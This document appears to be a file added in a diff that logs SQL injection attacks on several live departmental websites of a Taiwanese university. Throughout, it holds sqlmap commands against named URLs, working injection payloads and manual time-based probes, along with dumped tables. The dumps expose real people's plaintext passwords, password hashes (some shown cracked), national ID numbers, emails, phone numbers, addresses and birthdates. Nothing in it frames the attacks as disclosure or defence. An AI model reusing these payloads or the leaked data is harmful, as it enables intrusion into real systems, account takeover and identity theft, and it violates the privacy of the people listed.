@@ -1,0 +1,328 @@
+資訊工程學系
+sqlmap -u "http://www.cs.nchu.edu.tw/alumnus/login.php" --random-agent --drop-set-cookie --forms --crawl=2 --batch --dbs
+---
+Parameter: userid (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: url=WLXt&userid=' AND (SELECT 3005 FROM (SELECT(SLEEP(5)))ItyQ) AND 'PoFS'='PoFS&passwd=fvOg&admin2=agree&admin=admin&login_button=%E7%99%BB%E5%85%A5
+---
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] nchucs
+sqlmap -u "http://www.cs.nchu.edu.tw/alumnus/login.php" --random-agent --drop-set-cookie --forms --crawl=2 --batch -D nchucs --tables
+Database: nchucs
+[53 tables]
++------------------+
+| D                |
+| G                |
+| QandA            |
+| W56              |
+| version          |
+| academic         |
+| academic_reply   |
+| act_log          |
+| album_image      |
+| album_list       |
+| alumnus_guest    |
+| alumnus_job      |
+| alumnus_user     |
+| class            |
+| class_copy       |
+| class_copy3      |
+| competition      |
+| counter          |
+| course           |
+| course_name      |
+| discuss          |
+| doc              |
+| enroll           |
+| exam1            |
+| exam2            |
+| faculty          |
+| form             |
+| friends          |
+| guest_book       |
+| guest_book_reply |
+| honorNews        |
+| intern           |
+| introduction     |
+| laboratory       |
+| laboratory2      |
+| members          |
+| news             |
+| news_author      |
+| post_old         |
+| publish          |
+| qa               |
+| reply            |
+| research         |
+| rule             |
+| scholarship      |
+| seminar          |
+| site_manager     |
+| slider           |
+| sshare           |
+| student          |
+| students         |
+| temp             |
+| visitor          |
++------------------+
+
+sqlmap -u "http://www.cs.nchu.edu.tw/alumnus/login.php" --random-agent --drop-set-cookie --forms --crawl=2 --batch -D nchucs -T students --columns
+Table: students
+[5 columns]
++----------+------------------+
+| Column   | Type             |
++----------+------------------+
+| count    | int(11)          |
+| degree   | int(2)           |
+| id       | int(10) unsigned |
+| name     | varchar(8)       |
+| password | varchar(10)      |
++----------+------------------+
+
+sqlmap -u "http://www.cs.nchu.edu.tw/alumnus/login.php" --random-agent --drop-set-cookie --forms --crawl=2 --batch -D nchucs -T news_author --dump --hex
+Database: nchucs
+Table: news_author
+[4 entries]
++------------+------+------------+
+| id         | name | password   |
++------------+------+------------+
+| 0801decade | 李振維 | b47tydnf   |
+| Annie      | 陳丹尼 | nccsheu822 |
+| jbee       | 翁繹佳 | jbee0624   |
+| lily21126  | 靖怡  | 784487Nchu |
++------------+------+------------+
+
+sqlmap -u "http://www.cs.nchu.edu.tw/alumnus/login.php" --random-agent --drop-set-cookie --forms --crawl=2 --batch -D nchucs -T students --start 1 --stop 2 --dump --hex
+Database: nchucs
+Table: students
+[2 entries]
++----------+------+--------+---------+------------+
+| id       | name | degree | count   | password   |
++----------+------+--------+---------+------------+
+| 48942005 | 鍾現  | 1      | 1       | C120894458 |
+| 49040034 | 林家祥 | 1      | 3       | P122923005 |
++----------+------+--------+---------+------------+
+
+sqlmap -u "http://www.cs.nchu.edu.tw/alumnus/login.php" --random-agent --drop-set-cookie --forms --crawl=2 --batch -D nchucs -T members --start 1 --stop 2 --dump --hex
+Database: nchucs
+Table: members
+[2 entries]
++---------+----------+------+---------+-----+-------+------------------------+-------+---------------------+---------+---------+----------+----------+----------+----------+
+| id      | schoolid | x    | pic     | sex | black | email                  | nomem | date                | start   | tempdel | nickname | password | realjoin | realname |
++---------+----------+------+---------+-----+-------+------------------------+-------+---------------------+---------+---------+----------+----------+----------+----------+
+| kiwi    | 0        | NULL | <blank> | 1   | NULL  | wiwi@mail.kiwi.com.tw  | 64    | 2003-11-17 14:59:18 | 1       | NULL    | 小異國     | kiwi     | NULL     | 小度      |
+| fileman | 78956027 | NULL | <blank> | 1   | NULL  | fileman@cs.nchu.edu.tw | 80    | 2004-05-03 17:30:39 | 1       | NULL    | 藍色保特瓶  | !@anubis | NULL     | 張任烜     |
++---------+----------+------+---------+-----+-------+------------------------+-------+---------------------+---------+---------+----------+----------+----------+----------+
+
+https://www.educ.nchu.edu.tw/0'XOR(if(MID(database(),1,1)="c",sleep(6),0))XOR'Z
+
+/0'XOR(if(MID(database(),1,1)="c",sleep(6),0))XOR'Z
+/0'XOR(if(MID(database(),2,1)="t",sleep(6),0))XOR'Z
+/0'XOR(if(MID(database(),3,1)="e",sleep(6),0))XOR'Z
+/0'XOR(if(MID(database(),4,1)="n",sleep(6),0))XOR'Z
+/0'XOR(if(MID(database(),5,1)="c",sleep(6),0))XOR'Z
+/0'XOR(if(MID(database(),6,1)="h",sleep(6),0))XOR'Z
+/0'XOR(if(MID(database(),7,1)="u",sleep(6),0))XOR'Z
+
+通訊工程研究所
+sqlmap -u "http://www.ice.nchu.edu.tw/en/wb_link.asp?type=2" --random-agent --drop-set-cookie --crawl=2 --batch --hex --dbs
+Parameter: type (GET)
+    Type: error-based
+    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
+    Payload: type=2 AND 8332 IN (SELECT (CHAR(113)+CHAR(107)+CHAR(112)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (8332=8332) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113)))
+
+    Type: inline query
+    Title: Microsoft SQL Server/Sybase inline queries
+    Payload: type=(SELECT CHAR(113)+CHAR(107)+CHAR(112)+CHAR(106)+CHAR(113)+(CASE WHEN (8014=8014) THEN CHAR(49) ELSE CHAR(48) END)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113))
+
+    Type: stacked queries
+    Title: Microsoft SQL Server/Sybase stacked queries (DECLARE - comment)
+    Payload: type=2;DECLARE @x CHAR(9);SET @x=0x303a303a35;WAITFOR DELAY @x--
+
+    Type: time-based blind
+    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)
+    Payload: type=2 AND 5679=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: type=-4013 UNION ALL SELECT NULL,CHAR(113)+CHAR(107)+CHAR(112)+CHAR(106)+CHAR(113)+CHAR(73)+CHAR(86)+CHAR(76)+CHAR(80)+CHAR(101)+CHAR(79)+CHAR(114)+CHAR(68)+CHAR(105)+CHAR(114)+CHAR(71)+CHAR(75)+CHAR(83)+CHAR(68)+CHAR(101)+CHAR(109)+CHAR(74)+CHAR(97)+CHAR(104)+CHAR(116)+CHAR(111)+CHAR(111)+CHAR(108)+CHAR(82)+CHAR(101)+CHAR(72)+CHAR(84)+CHAR(101)+CHAR(80)+CHAR(105)+CHAR(73)+CHAR(104)+CHAR(73)+CHAR(74)+CHAR(65)+CHAR(86)+CHAR(115)+CHAR(122)+CHAR(106)+CHAR(90)+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113)-- mrdo
+back-end DBMS: Microsoft SQL Server 2005
+[12:31:42] [INFO] fetching database names
+[12:31:42] [INFO] retrieved: 'ENCHU'
+[12:31:42] [INFO] retrieved: 'master'
+[12:31:42] [INFO] retrieved: 'MengYao'
+[12:31:43] [INFO] retrieved: 'model'
+[12:31:43] [INFO] retrieved: 'msdb'
+[12:31:43] [INFO] retrieved: 'NCHU_MS'
+[12:31:43] [INFO] retrieved: 'NCHU_MS'
+[12:31:43] [INFO] retrieved: 'OSRC'
+[12:31:43] [INFO] retrieved: 'tempdb'
+[12:31:43] [INFO] retrieved: 'VLSI2011'
+available databases [9]:                                                                                                                                                                                                                  
+[*] ENCHU
+[*] master
+[*] MengYao
+[*] model
+[*] msdb
+[*] NCHU_MS
+[*] OSRC
+[*] tempdb
+[*] VLSI2011
+sqlmap -u "http://www.ice.nchu.edu.tw/en/wb_link.asp?type=2" --random-agent --drop-set-cookie --crawl=2 --batch -D ENCHU --tables
+Database: ENCHU                                                                                                                                                                                                                           
+[47 tables]
++---------------------+
+| Data_AnnClass       |
+| Data_AnnSignup      |
+| Data_Announcement   |
+| Data_CPClass        |
+| Data_Clerk          |
+| Data_CourseBasic    |
+| Data_CourseDesign   |
+| Data_CourseItem     |
+| Data_CoursePlan     |
+| Data_CourseSchedule |
+| Data_DepGroup       |
+| Data_Department     |
+| Data_DocumentClass  |
+| Data_DocumentClass  |
+| Data_FileClass      |
+| Data_Files          |
+| Data_Graduate       |
+| Data_Instruction    |
+| Data_RecruitClass   |
+| Data_RecruitClass   |
+| Data_Room           |
+| Data_RoomSchedule   |
+| Data_SessionRecord  |
+| Data_Teacher        |
+| Data_Users          |
+| Data_WebAdmission   |
+| Data_WebCourse      |
+| Data_WebLinkClass   |
+| Data_WebLinkClass   |
+| Data_WebResearch    |
+| Data_WebResourse    |
+| Data_WebSelf        |
+| Data_WebUnit        |
+| Data_WorkingRecord  |
+| Data_WritingClass   |
+| Data_Writings       |
+| Sys_Counter         |
+| Sys_IndexProg       |
+| Sys_ProgClass       |
+| Sys_ProgGroup       |
+| dtproperties        |
+| vw_Announce         |
+| vw_CoursePlan       |
+| vw_Document         |
+| vw_Recruit          |
+| vw_Teacher          |
+| vw_Writings         |
++---------------------+
+
+sqlmap -u "http://www.ice.nchu.edu.tw/en/wb_link.asp?type=2" --random-agent --drop-set-cookie --crawl=2 --batch -D NCHU_MS --tables
+Database: NCHU_MS                                                                                                                                                                                                                         
+[42 tables]
++-------------------+
+| Com_Location      |
+| Com_Zoon          |
+| Data_AlbumBook    |
+| Data_AlbumPhoto   |
+| Data_AnnSignup    |
+| Data_Announcement |
+| Data_Department   |
+| Data_DocExtension |
+| Data_DocLinks     |
+| Data_Form02       |
+| Data_FormA1       |
+| Data_FormC1       |
+| Data_FormG1       |
+| Data_FormH1       |
+| Data_FormI1       |
+| Data_FormI2       |
+| Data_FormJ1       |
+| Data_FormJ3       |
+| Data_FormL1       |
+| Data_HomeArea     |
+| Data_Leader       |
+| Data_MReports01   |
+| Data_MReports02   |
+| Data_ProjectTalk  |
+| Data_Projects     |
+| Data_PublicFile   |
+| Data_Reports      |
+| Data_Schedule     |
+| Data_SubProjects  |
+| Data_Users        |
+| Data_WebClass     |
+| Data_WebUnit      |
+| Sys_ProgClass     |
+| Sys_ProgDep       |
+| Sys_ProgExchange  |
+| Sys_ProgGroup     |
+| Sys_ProgIndex     |
+| !Data_Form01      |
+| !Data_FormD1      |
+| !Data_FormE1      |
+| !Data_FormF1      |
+| !Data_FormJ2      |
++-------------------+
+
+電機工程學系
+http://www.ee.nchu.edu.tw/wb_photo02.asp?cid=1&nid=-1%20OR%203*2*1=6%20AND%20000359=000359&pageno=1
+sqlmap -u "http://www.ee.nchu.edu.tw/wb_photo02.asp?cid=1&nid=1&pageno=1" --batch --tamper charencode --dbs
+web server operating system: Windows XP or 2003
+web application technology: ASP, Microsoft IIS 6.0, ASP.NET
+back-end DBMS: Microsoft SQL Server 2005
+[14:08:15] [INFO] fetching database names
+[14:08:15] [INFO] resumed: 'ENCHU'
+[14:08:15] [INFO] resumed: 'master'
+[14:08:15] [INFO] resumed: 'MengYao'
+[14:08:15] [INFO] resumed: 'model'
+[14:08:15] [INFO] resumed: 'msdb'
+[14:08:15] [INFO] resumed: 'NCHU'
+[14:08:15] [INFO] resumed: 'NCHU_MS'
+[14:08:15] [INFO] resumed: 'OSRC'
+[14:08:15] [INFO] resumed: 'tempdb'
+[14:08:15] [INFO] resumed: 'VLSI2011'
+available databases [10]:
+[*] ENCHU
+[*] master
+[*] MengYao
+[*] model
+[*] msdb
+[*] NCHU
+[*] NCHU_MS
+[*] OSRC
+[*] tempdb
+[*] VLSI2011
+sqlmap -u "http://www.ee.nchu.edu.tw/wb_photo02.asp?cid=1&nid=1&pageno=1" --batch --tamper charencode -D NCHU_MS -T Data_Users --dump
+Database: NCHU_MS                                                                                                                                          
+Table: Data_Users
+[7 entries]
++-------+-------+------------+----+-------+---------+------------------------+-----------------------+-----------------+-------------------------------------------------------------+--------------------------------------------------+--------------------------------------------------+---------+--------------------+--------------------+-------------+--------------------+----------------------------+
+| DepID | Valid | PersonID   | SN | Sex   | City    | Email                  | Files                 | Phone           | Address                                                     | UserAcc                                          | UserPwd                                          | ZipCode | BirthDay           | UserName           | CellPhone   | CreateDate         | Position                   |
++-------+-------+------------+----+-------+---------+------------------------+-----------------------+-----------------+-------------------------------------------------------------+--------------------------------------------------+--------------------------------------------------+---------+--------------------+--------------------+-------------+--------------------+----------------------------+
+| 2     | 1     | L100530174 | 1  | \xa8k | 9       | vincent@top-one.com.tw | 13770977900001(1).jpg | 04-2233-9900    | \xbcw\xa4Ƶ\xf3103\xb8\xb9                                   | B15AB3F829F0F897FE507EF548741AFB (vincent)       | 50AD2CF118D653BA332C5F48E210E750                 | 404     | <blank>            | Vincent Lin        | 0982611688  | 01 31 2007 11:12AM | \xb7~\xb0\xc8\xc1`\xba\xca |
+| 2     | 1     | P123456787 | 2  | \xa8k | 9       | bbc99@top-one.com.tw   | <blank>               | 04-22339900     | \xa5x\xa4\xa4\xa5\xab\xa5_\xa4ϤE\xc0s\xb5\xf3               | 1B0C070DAE87A29B193348481C6C834E                 | 2BD73D3F236D29657A315C26D6DEDB67                 | 406     | 10 18 1980 12:00AM | BBC                | 0911-999999 | 01 31 2007 11:12AM | \xa8t\xb2Τu\xb5{\xaev      |
+| 1     | 1     | A123456789 | 9  | \xa4k | 9       | candychai@nchu.edu.tw  | <blank>               | 04-22854086     | \xa5x\xa4\xa4\xa5\xab\xabn\xb0Ͽ\xb3\xa4j\xb8\xf4145\xb8\xb9 | A66ABB5684C45962D887564F08346E8D (admin123456)   | A66ABB5684C45962D887564F08346E8D (admin123456)   | 402     | 11 16 1982 12:00AM | \xb8\xeb?\xbbT     | 0912-364345 | 08 21 2013  2:06PM | \xb1M\xaeקU\xb2z           |
+| 1     | 1     | <blank>    | 64 | \xa4k | <blank> | <blank>                | <blank>               | <blank>         | <blank>                                                     | 88981504A9A086F9CBD71CB0F23E75BE                 | 88981504A9A086F9CBD71CB0F23E75BE                 | <blank> | <blank>            | Ĭ\xa8μ\xfc         | <blank>     | 12 24 2018  1:14PM | \xb1M\xaeקU\xb2z           |
+| 1     | 1     | A123456789 | 65 | \xa8k | 9       | holin@nchu.edu.tw      | <blank>               | 0422851549 ;688 | \xa5x\xa4\xa4\xa5\xab\xabn\xb0Ͽ\xb3\xa4j\xb8\xf4145\xb8\xb9 | 3A4EBF16A4795AD258E5408BAE7BE341 (admin12345678) | 3A4EBF16A4795AD258E5408BAE7BE341 (admin12345678) | 402     | 02  7 1988 12:00AM | \xaaL\xa7\xd3\xc2E | 0919719789  | 01 17 2019  4:45PM | \xa7U\xb1\xd0              |
+| 1     | 1     | <blank>    | 66 | \xa4k | <blank> | <blank>                | <blank>               | <blank>         | <blank>                                                     | 93FFAABBBEBDE5EB556705F7013CEAC9                 | 93FFAABBBEBDE5EB556705F7013CEAC9                 | <blank> | <blank>            | \xb8\xeb?\xbbT     | <blank>     | 01 17 2019  5:10PM | \xa7U\xb2z                 |
+| 1     | 1     | <blank>    | 67 | \xa4k | <blank> | soa222@most.gov.tw     | <blank>               | <blank>         | <blank>                                                     | 85F592E3C6562B53E321615AD9B6827E                 | 85F592E3C6562B53E321615AD9B6827E                 | <blank> | <blank>            | \xc1¥ɮS            | <blank>     | 01 21 2019  4:01PM | \xa6\xe6\xacF\xa4H\xad\xfb |
++-------+-------+------------+----+-------+---------+------------------------+-----------------------+-----------------+-------------------------------------------------------------+--------------------------------------------------+--------------------------------------------------+---------+--------------------+--------------------+-------------+--------------------+----------------------------+
+sqlmap -u "http://www.ee.nchu.edu.tw/wb_photo02.asp?cid=1&nid=1&pageno=1" --batch --tamper charencode -D MengYao -T Data_Users --dump
+Database: MengYao                                                                                                                                          
+Table: Data_Users
+[3 entries]
++--------+-------+------------+----+-------+------+------------------------+--------------+------------------------------------------------------+------------------------------------------------+------------------------------------------------+---------+--------------------+----------------+--------------+--------------------+------------------------------+
+| DepID  | Valid | PersonID   | SN | Sex   | City | Email                  | Phone        | Address                                              | UserAcc                                        | UserPwd                                        | ZipCode | BirthDay           | UserName       | CellPhone    | CreateDate         | Position                     |
++--------+-------+------------+----+-------+------+------------------------+--------------+------------------------------------------------------+------------------------------------------------+------------------------------------------------+---------+--------------------+----------------+--------------+--------------------+------------------------------+
+| ZGH001 | 1     | <blank>    | 1  | \xa8k | 9    | vincent@top-one.com.tw | 04-2233-9900 | \xbcw\xa4Ƶ\xf3103\xb8\xb9                            | B15AB3F829F0F897FE507EF548741AFB (vincent)     | 50AD2CF118D653BA332C5F48E210E750               | 404     | <blank>            | Vincent        | 0921-760-688 | 01 31 2007 11:12AM | \xb7~\xb0\xc8\xc1`\xba\xca   |
+| ZGH001 | 1     | P123456789 | 2  | \xa8k | 9    | bbc99@top-one.com.tw   | 04-22339900  | \xa5x\xa4\xa4\xa5\xab\xa5_\xb0ϼw\xa4Ƶ\xf3103\xb8\xb9 | 1B0C070DAE87A29B193348481C6C834E               | 2BD73D3F236D29657A315C26D6DEDB67               | 404     | 10 18 1980 12:00AM | BBC            | 0911-999999  | 01 31 2007 11:12AM | \xb5{\xa6\xa1\xb3]\xadp\xaev |
+| ADM001 | 1     | <blank>    | 3  | \xa8k | 9    | <blank>                | 22339900     | \xa5x\xa4\xa4\xa5\xab\xa5_\xb0\xcf                   | A66ABB5684C45962D887564F08346E8D (admin123456) | A66ABB5684C45962D887564F08346E8D (admin123456) | 404     | <blank>            | \xba޲z\xaa\xcc | <blank>      | 12 14 2011  3:19PM | ADMIN                        |
++--------+-------+------------+----+-------+------+------------------------+--------------+------------------------------------------------------+------------------------------------------------+------------------------------------------------+---------+--------------------+----------------+--------------+--------------------+------------------------------+
